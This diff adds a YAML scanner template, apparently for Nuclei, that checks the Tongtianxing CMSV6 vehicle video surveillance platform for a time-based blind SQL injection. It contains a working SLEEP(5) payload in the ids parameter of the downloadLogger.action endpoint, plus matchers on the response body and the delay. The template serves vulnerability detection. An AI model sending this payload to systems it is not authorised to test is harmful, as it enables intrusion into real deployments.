@@ -1,0 +1,30 @@
+id: tongtianxing-disable-sqli
+
+info:
+  name: tongtianxing-disable-sqli
+  author: fitz
+  severity: high
+  tags: 2024hvv,SQL Injection
+  description: 通天星CMSV6车载视频监控平台disable存在SQL注入漏洞
+  reference: https://stack.chaitin.com/vuldb/detail/40f64143-c85f-41a6-9d8d-fa749436c973
+
+http:
+  - raw:
+      - |
+        GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        
+    matchers-condition: and    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"result":0,"message":"OK","data":"","pagination":"","infos":"","key":"","resMap":""}'
+          
+      - type: dsl
+        dsl:
+          - 'duration>=5'
